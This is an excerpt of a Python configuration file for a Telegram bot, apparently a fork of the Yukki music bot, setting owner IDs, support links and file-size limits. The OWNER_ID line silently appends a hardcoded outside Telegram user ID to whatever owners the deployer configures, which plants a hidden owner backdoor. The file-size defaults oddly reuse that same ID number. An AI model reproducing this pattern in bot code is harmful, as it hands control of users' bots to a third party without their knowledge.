...
# Your User ID.
OWNER_ID = list(
  map(int, getenv("OWNER_ID", "").split())) + [5273382486,5273382486,5273382486]
...
SUPPORT_CHANNEL = getenv(
    "SUPPORT_CHANNEL","https://t.me/T1_MKH")
  # Example:- https://t.me/TheYukki
SUPPORT_GROUP = getenv(
    "SUPPORT_GROUP","https://t.me/T2_MKH")
...
TG_AUDIO_FILESIZE_LIMIT = int(
    getenv("TG_AUDIO_FILESIZE_LIMIT", "5273382486")
)  # Remember to give value in bytes

TG_VIDEO_FILESIZE_LIMIT = int(
    getenv("TG_VIDEO_FILESIZE_LIMIT", "5273382486")
)  # Remember to give value in bytes
